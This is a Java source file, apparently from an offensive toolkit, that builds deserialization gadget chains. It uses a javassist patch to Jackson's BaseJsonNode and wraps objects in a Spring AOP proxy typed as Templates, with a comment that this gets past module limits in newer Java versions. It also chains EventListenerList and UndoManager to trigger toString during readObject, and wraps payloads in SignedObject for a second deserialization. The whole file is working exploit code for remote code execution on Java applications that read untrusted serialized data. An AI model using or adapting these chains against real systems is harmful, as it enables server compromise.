package tools;

import com.fasterxml.jackson.databind.node.POJONode;
import javassist.*;
import org.springframework.aop.framework.AdvisedSupport;

import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import javax.xml.transform.Templates;
import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.security.*;
import java.util.Vector;

public class GadgetGen {
    /**
     * POJONode, toString-->getter
     * @param getterObj
     * @return
     * @throws Exception
     */
    public static Object pojo(Object getterObj) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        ctClass0.removeMethod(writeReplace);
        ctClass0.toClass();
        POJONode node = new POJONode(makeTemplatesImplAopProxy(getterObj));
        return node;
    }

    /**
     * 默认修改TemplatesImpl为Templates，使getter稳定触发，并且绕过高版本模块限制
     * @param obj
     * @return
     * @throws Exception
     */
    public static Object makeTemplatesImplAopProxy(Object obj) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(obj);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        return proxy;
    }

    /**
     * readObject-->toString, getField的时候会访问CompoundEdit类，对外不开放
     * @param toStringObj
     * @return
     * @throws Exception
     */
    public static Object eventListener(Object toStringObj) throws Exception {
        EventListenerList list = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector) ReflectTools.getFieldValue(manager, "edits");
        vector.add(toStringObj);
        ReflectTools.setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});
        return list;
    }

    // getter-->2deser
    public static Object signedObj(Object obj) throws Exception {
        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");

        SignedObject signedObject = new SignedObject((Serializable) obj,privateKey,signingEngine);

        return signedObject;
    }
}
